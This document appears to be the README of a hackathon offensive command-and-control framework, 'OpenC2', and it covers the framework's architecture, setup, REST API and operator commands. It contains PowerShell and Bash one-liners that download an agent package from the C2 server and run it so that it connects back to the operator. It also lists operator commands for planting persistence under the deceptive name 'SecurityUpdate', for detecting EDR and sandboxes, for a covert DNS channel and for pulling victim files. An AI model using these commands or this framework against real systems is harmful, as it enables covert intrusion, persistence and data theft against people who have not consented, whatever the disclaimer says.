# OpenC2 v1.0 — Framework de Command & Control

> **Hackathon Talento Tech 2026** — Ciberseguridad Ofensiva  
> Uso exclusivo en entornos autorizados bajo contrato de pruebas de seguridad.

---

## Qué es OpenC2

OpenC2 es un framework de Command & Control (C2) para ciberseguridad ofensiva, construido desde cero con:

- Comunicaciones **cifradas end-to-end** (RSA-3072 OAEP + AES-256-GCM + HMAC-SHA256)
- **Audit trail blockchain** SHA-256 encadenado con anclas en Solana Devnet/Mainnet
- Dashboard **React en tiempo real** vía SSE (Server-Sent Events)
- Plugin system **hot-swappable** con firma RSA-PSS (zero-trust de código)
- Canal covert **DNS** alternativo al WebSocket (base32 + AES-256-GCM opcional)
- **OPSEC inteligente**: detección de EDR/AV/Sysmon/Defender/sandbox en tiempo real
- **Multi-agente**: múltiples instancias en el mismo host via `--label`
- **JWT auth**: tokens con expiración + compatibilidad con token estático
- **Persistencia post-reboot**: Run Key, Scheduled Task, Cron, Systemd
- **Cola SQLite**: tareas sobreviven reinicio del servidor
- **Jitter de heartbeat**: ±30% aleatorio para evadir detección por tráfico

---

## Arquitectura

```
Operador (Dashboard React)
        │ SSE + REST (JWT)
        ▼
┌──────────────────────────┐
│   OpenC2 Server           │  FastAPI + asyncio
│   ├── WebSocket Channel   │  RSA-3072 handshake + AES-256-GCM
│   ├── DNS Covert Channel  │  base32 TXT + AES-256-GCM opcional
│   ├── Agent Manager       │  PubSub broker + SQLite queue
│   ├── Audit Trail         │  SHA-256 blockchain → Solana
│   └── Plugin Hot-Swap     │  RSA-PSS firma antes de importar
└──────────────────────────┘
        │ WebSocket cifrado (o DNS)
        ▼
┌──────────────────────────┐
│   OpenC2 Agent (target)   │  Python asyncio
│   ├── shell               │  exec sin stdin interactivo
│   ├── sysinfo             │  CPU, RAM, red, procesos, env
│   ├── opsec               │  EDR/AV/Sysmon/sandbox detection
│   ├── persist             │  RunKey/ScheduledTask/Cron/Systemd
│   └── filetransfer        │  upload/download/list/checksum
└──────────────────────────┘
```

---

## Estructura del repositorio

```
c2-aligo/
├── server/                  # Servidor FastAPI (Python)
│   ├── main.py              # Entry point + REST/WS/SSE endpoints
│   ├── requirements.txt     # Dependencias Python
│   ├── Dockerfile
│   ├── .env                 # Variables de entorno (editar antes de usar)
│   └── core/
│       ├── crypto.py        # RSA-3072 + AES-256-GCM + HMAC-SHA256
│       ├── protocol.py      # OpenC2 Protocol v1 (8 tipos de mensaje)
│       ├── agent_manager.py # Registro + PubSub + SQLite queue
│       ├── audit_trail.py   # Blockchain SHA-256
│       ├── observability.py # Métricas en tiempo real
│       ├── solana_anchor.py # Ancla hashes en Solana (devnet/mainnet)
│       └── channels/
│           ├── websocket.py # Canal principal cifrado
│           └── dns.py       # Canal covert DNS
├── agent/                   # Agente Python (ejecuta en el target)
│   ├── agent.py             # Loop principal + handshake + heartbeat
│   └── plugins/
│       ├── base.py          # BasePlugin ABC
│       ├── shell.py         # Comandos de sistema (stdin=DEVNULL)
│       ├── sysinfo.py       # Info del sistema
│       ├── opsec.py         # Detección EDR/AV/sandbox
│       ├── persist.py       # Persistencia post-reboot (4 mecanismos)
│       └── filetransfer.py  # Transferencia de archivos (10MB max)
├── dashboard/               # React + Vite + Tailwind
│   └── src/
│       ├── App.tsx          # SSE handler + formatters de output
│       ├── components/
│       │   ├── Terminal.tsx           # Terminal con historial + shortcuts
│       │   ├── AgentList.tsx          # Lista de agentes + badge de label
│       │   ├── MetricsPanel.tsx       # Gráficas CPU/RAM
│       │   ├── ObservabilityPanel.tsx # Métricas del servidor
│       │   └── SolanaPanel.tsx        # Estado blockchain
│       └── hooks/useSSE.ts  # Hook SSE
├── docker-compose.yml
├── install.bat              # Instalador Windows (un clic)
├── start.bat                # Launcher Windows (un clic)
└── docs/
    └── TECHNICAL.md         # Documentación técnica completa
```

---

## Requisitos

| Componente | Versión mínima |
|---|---|
| Python | 3.10+ |
| Node.js | 18+ |
| Docker (opcional) | 24+ |
| SO | Windows 10/11, Ubuntu 20.04+, macOS 12+ |

---

## Instalación rápida (Windows)

```
1. Doble clic en:  install.bat
   (instala todas las dependencias Python y Node.js)

2. Doble clic en:  start.bat
   (levanta servidor + agente + dashboard)

3. Abrir:  http://localhost:5173
   Token:   openc2-dev-token
```

---

## Instalación manual

### Servidor
```bash
cd server
pip install -r requirements.txt
# Editar .env con tu configuración
python main.py
```

### Agente
```bash
cd agent
pip install psutil websockets cryptography

# Agente único
python agent.py --server ws://localhost:8000/ws

# Multi-agente en el mismo host
python agent.py --server ws://localhost:8000/ws --label recon
python agent.py --server ws://localhost:8000/ws --label lateral
```

### Dashboard
```bash
cd dashboard
npm install
npm run dev
# → http://localhost:5173
```

---

## Docker Compose

```bash
docker compose up -d
docker compose logs -f server
```

Puertos: `:8000` (WS+REST+SSE), `:5353/udp` (DNS covert), `:5173` (dashboard).

---

## Configuración (.env)

```bash
OPERATOR_TOKEN=openc2-dev-token     # Cambiar en producción
JWT_SECRET=                          # Auto-generado si vacío
JWT_EXPIRE_HOURS=24
SOLANA_ANCHOR=true
SOLANA_NETWORK=devnet                # devnet | testnet | mainnet-beta
HEARTBEAT_INTERVAL=10
HEARTBEAT_JITTER=0.3                 # ±30% aleatorio anti-fingerprint
DNS_SHARED_KEY=                      # 64 hex chars para cifrar canal DNS
QUEUE_DB_PATH=pending_tasks.db       # Cola SQLite persistente
```

---

## Comandos del Terminal (Dashboard)

Seleccionar un agente y escribir:

### Shell
```
shell whoami
shell ipconfig /all
shell net user
shell cmd /c dir C:\Users
shell tasklist
```
> `cmd`, `time`, `date` solos están bloqueados (shells interactivos).  
> Usar `shell cmd /c <comando>` para subcomandos.

### Sistema
```
sysinfo          # Resumen: host, OS, CPU, RAM, CWD
ps               # Procesos activos (top 15)
netstat          # Conexiones TCP activas
env              # Variables de entorno
```

### OPSEC
```
opsec            # Reporte completo (EDR + Defender + Sysmon + Sandbox + Red)
opsec edr        # Solo EDR/AV (Crowdstrike, Sentinel, Defender...)
opsec defender   # Windows Defender status
opsec sysmon     # Sysmon activo?
opsec events     # Event logs últimas 4h
opsec net        # Herramientas de captura (Wireshark, tcpdump...)
opsec sandbox    # Detectar VM/sandbox
opsec watch      # Monitoreo continuo cada 30s (envía alertas proactivas)
opsec stop       # Detener monitoreo
```

### Persistencia post-reboot
```
persist status
persist install method=windows_run_key name=SecurityUpdate
persist install method=windows_scheduled_task name=SecurityUpdate
persist install method=linux_cron name=SecurityUpdate
persist install method=linux_systemd name=SecurityUpdate
persist uninstall method=windows_run_key name=SecurityUpdate
```

### Transferencia de archivos
```
filetransfer list path=C:\Users\victim\Desktop
filetransfer upload path=C:\Users\victim\secret.docx
filetransfer checksum path=C:\Windows\System32\cmd.exe
filetransfer mkdir path=C:\Windows\Temp\staging
```

### Operaciones avanzadas
```
workflow sysinfo -> opsec -> shell whoami    # Cadena de tareas
snapshot                                      # Capturar estado
snapshot diff                                 # Comparar snapshots
doctor                                        # Diagnóstico del servidor
audit verify                                  # Verificar integridad blockchain
```

---

## API REST

```
# Auth
POST /api/auth/token          {"password": "openc2-dev-token"} → JWT
GET  /api/auth/verify         Verificar token

# Agentes
GET  /api/agents
POST /api/agents/{id}/task    {"plugin":..., "action":..., "args":...}
POST /api/agents/{id}/workflow
POST /api/agents/{id}/snapshot
GET  /api/agents/{id}/snapshot/diff

# Archivos
POST /api/agents/{id}/files
GET  /api/agents/{id}/files
GET  /api/agents/{id}/files/{name}

# Infra
GET  /api/stream              SSE en tiempo real
GET  /api/doctor              Diagnóstico
GET  /api/audit/verify        Verificar blockchain
GET  /api/solana              Estado Solana
GET  /api/stage               Página de despliegue del agente
GET  /api/stage/package       ZIP del agente preconfigurado
```

Header: `X-Operator-Token: <jwt-o-token-estatico>`

---

## Despliegue remoto del agente

**Página de staging** (el target abre en browser):
```
http://<IP-SERVIDOR>:8000/api/stage
http://<IP-SERVIDOR>:8000/api/stage?label=recon    # Con label
```

**PowerShell one-liner**:
```powershell
powershell -c "Invoke-WebRequest 'http://<IP>:8000/api/stage/package' -OutFile a.zip; Expand-Archive a.zip -Force; cd openc2-agent; pip install -r requirements.txt; python connect.py --server ws://<IP>:8000/ws"
```

**Bash one-liner**:
```bash
curl -sO http://<IP>:8000/api/stage/package && unzip openc2-agent.zip && cd openc2-agent && pip3 install -r requirements.txt && python3 connect.py --server ws://<IP>:8000/ws
```

**Multi-agente en el mismo host**:
```bash
python agent.py --server ws://<IP>:8000/ws --label recon
python agent.py --server ws://<IP>:8000/ws --label lateral
# O via env: AGENT_LABEL=recon python agent.py ...
```

---

## Audit Trail en Solana

Cada resultado se ancla en Solana con memo `openc2:block#<id>:<hash>`.

1. Ir a https://explorer.solana.com/?cluster=devnet
2. Buscar la wallet del servidor (en `solana_wallet.json`)
3. Ver transacciones con memo `openc2:block#...`

---

## Aviso Legal

Este software es exclusivamente para pruebas de seguridad autorizadas.  
Requiere autorización escrita del propietario antes de cualquier uso.  
El uso no autorizado puede constituir un delito bajo la legislación vigente.
